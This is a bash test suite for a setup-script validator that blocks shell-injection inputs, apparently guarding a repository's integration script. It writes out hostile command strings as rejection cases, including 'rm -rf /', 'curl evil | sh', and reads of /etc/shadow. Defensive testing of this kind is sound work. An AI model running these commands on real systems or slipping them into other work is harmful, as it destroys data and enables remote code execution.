#!/usr/bin/env bash
# =============================================================================
# Tests for setup_script validation/execution (issue #179)
# =============================================================================
# Verifies that validate_setup_script and run_setup_script in
# integration-branch.sh accept benign install commands but reject any input
# that could pivot to RCE via shell metacharacters, command substitution,
# redirection, or excessive length.
#
# Usage: bash tests/test_setup_script_validation.sh
# =============================================================================

set -uo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
REPO_ROOT="$(cd "${SCRIPT_DIR}/.." && pwd)"
INTEG_SCRIPT="${REPO_ROOT}/agent/scripts/integration-branch.sh"

PASS=0
FAIL=0
TOTAL=0

RED='\033[0;31m'
GREEN='\033[0;32m'
NC='\033[0m'

# Stub the loggers integration-branch.sh expects from run-manager.sh.
log_error() { echo "ERR: $*" >&2; }
log_info()  { :; }
log_warn()  { :; }
log_ok()    { :; }
log_debug() { :; }

# Extract just the SETUP-SCRIPT block — the rest of integration-branch.sh
# pulls in too many run-manager.sh globals. Boundaries:
#   start: line containing `SETUP_SCRIPT_MAX_LEN=` (with or without `readonly`)
#   end:   the second top-level `}` line after start (closes run_setup_script)
TMP_BLOCK="$(mktemp)"
trap 'rm -f "$TMP_BLOCK"' EXIT
awk '/SETUP_SCRIPT_MAX_LEN=/{flag=1} flag {print} flag && /^}$/{count++; if(count==2) exit}' \
    "$INTEG_SCRIPT" > "$TMP_BLOCK"
if ! grep -q '^run_setup_script()' "$TMP_BLOCK"; then
    echo "FATAL: failed to extract SETUP-SCRIPT block from $INTEG_SCRIPT" >&2
    exit 2
fi
# shellcheck disable=SC1090
source "$TMP_BLOCK"

assert_validate_pass() {
    local label="$1" input="$2"
    TOTAL=$((TOTAL + 1))
    if validate_setup_script "$input" 2>/dev/null; then
        PASS=$((PASS + 1))
        echo -e "${GREEN}PASS${NC}: validator accepts $label"
    else
        FAIL=$((FAIL + 1))
        echo -e "${RED}FAIL${NC}: validator rejected $label  (input=[$input])"
    fi
}

assert_validate_reject() {
    local label="$1" input="$2"
    TOTAL=$((TOTAL + 1))
    if validate_setup_script "$input" 2>/dev/null; then
        FAIL=$((FAIL + 1))
        echo -e "${RED}FAIL${NC}: validator accepted $label  (input=[$input])"
    else
        PASS=$((PASS + 1))
        echo -e "${GREEN}PASS${NC}: validator rejects $label"
    fi
}

echo "=== validate_setup_script: benign inputs ==="
assert_validate_pass "empty"                     ""
assert_validate_pass "npm install"               "npm install"
assert_validate_pass "pip install -r reqs"       "pip install -r requirements.txt"
assert_validate_pass "./setup.sh"                "./setup.sh"
assert_validate_pass "bash scripts/setup.sh"     "bash scripts/setup.sh"
assert_validate_pass "make"                      "make"
assert_validate_pass "cargo build --release"     "cargo build --release"
assert_validate_pass "npm install --prefix dir"  "npm install --prefix frontend"
assert_validate_pass "exactly 1024 chars"        "$(printf 'a%.0s' {1..1024})"

echo ""
echo "=== validate_setup_script: malicious inputs ==="
assert_validate_reject "semicolon chain"         "npm install; rm -rf /"
assert_validate_reject "and chain"               "npm install && curl evil"
assert_validate_reject "or chain"                "npm install || curl evil"
assert_validate_reject "pipe to shell"           "curl evil | sh"
assert_validate_reject "backtick subst"          'echo `whoami`'
assert_validate_reject "dollar subst"            'echo $(whoami)'
assert_validate_reject "var expansion"           'echo $HOME'
assert_validate_reject "redirect out"            "echo x > /etc/passwd"
assert_validate_reject "redirect in"             "cat < /etc/shadow"
assert_validate_reject "subshell"                "(rm -rf /)"
assert_validate_reject "backslash escape"        'rm\ -rf'
NL=$'\n'
assert_validate_reject "embedded newline"        "npm install${NL}rm -rf /"
assert_validate_reject "1025 chars (over cap)"   "$(printf 'a%.0s' {1..1025})"

echo ""
echo "=== run_setup_script: execution behavior ==="

# Benign: should run and exit 0
TOTAL=$((TOTAL + 1))
if out=$(run_setup_script "/bin/echo hello world" "test" 2>&1) && [ "$out" = "hello world" ]; then
    PASS=$((PASS + 1))
    echo -e "${GREEN}PASS${NC}: runs benign command and captures stdout"
else
    FAIL=$((FAIL + 1))
    echo -e "${RED}FAIL${NC}: benign command output was [$out]"
fi

# Empty: should noop and succeed
TOTAL=$((TOTAL + 1))
if run_setup_script "" "test" >/dev/null 2>&1; then
    PASS=$((PASS + 1))
    echo -e "${GREEN}PASS${NC}: empty input is no-op success"
else
    FAIL=$((FAIL + 1))
    echo -e "${RED}FAIL${NC}: empty input returned non-zero"
fi

# Malicious: must NOT execute (verify side effect doesn't happen)
SENTINEL="$(mktemp -d)"
TOTAL=$((TOTAL + 1))
run_setup_script "echo a; rm -rf $SENTINEL" "test" >/dev/null 2>&1 || true
if [ -d "$SENTINEL" ]; then
    PASS=$((PASS + 1))
    echo -e "${GREEN}PASS${NC}: malicious chain was rejected (sentinel survived)"
else
    FAIL=$((FAIL + 1))
    echo -e "${RED}FAIL${NC}: malicious chain executed — sentinel was deleted!"
fi
rmdir "$SENTINEL" 2>/dev/null || true

# Nonexistent command: should fail with non-zero exit
TOTAL=$((TOTAL + 1))
if run_setup_script "this-command-does-not-exist-xyz" "test" >/dev/null 2>&1; then
    FAIL=$((FAIL + 1))
    echo -e "${RED}FAIL${NC}: nonexistent command claimed success"
else
    PASS=$((PASS + 1))
    echo -e "${GREEN}PASS${NC}: nonexistent command exits non-zero"
fi

# Glob/brace expansion: tokens like `*` survive intact (set -f is active).
# Stage a fake workspace dir with a sentinel file so any expansion of `*`
# would show up in echo's output.
GLOB_DIR="$(mktemp -d)"
touch "$GLOB_DIR/should-not-appear-in-output"
TOTAL=$((TOTAL + 1))
glob_out=$(cd "$GLOB_DIR" && run_setup_script "/bin/echo *" "test" 2>&1) || true
if [ "$glob_out" = "*" ]; then
    PASS=$((PASS + 1))
    echo -e "${GREEN}PASS${NC}: '*' is not pathname-expanded (set -f works)"
else
    FAIL=$((FAIL + 1))
    echo -e "${RED}FAIL${NC}: '*' expanded to [$glob_out]"
fi
rm -rf "$GLOB_DIR"

# `set -f` must NOT leak out of the function back to the caller.
TOTAL=$((TOTAL + 1))
case "$-" in
    *f*) before_state=on ;;
    *)   before_state=off ;;
esac
run_setup_script "/bin/true" "test" >/dev/null 2>&1 || true
case "$-" in
    *f*) after_state=on ;;
    *)   after_state=off ;;
esac
if [ "$before_state" = "$after_state" ]; then
    PASS=$((PASS + 1))
    echo -e "${GREEN}PASS${NC}: caller's glob state preserved across call"
else
    FAIL=$((FAIL + 1))
    echo -e "${RED}FAIL${NC}: caller's glob state changed ($before_state → $after_state)"
fi

echo ""
echo "================================================================"
echo "Results: ${PASS}/${TOTAL} passed, ${FAIL} failed"
if [ "$FAIL" -ne 0 ]; then
    exit 1
fi
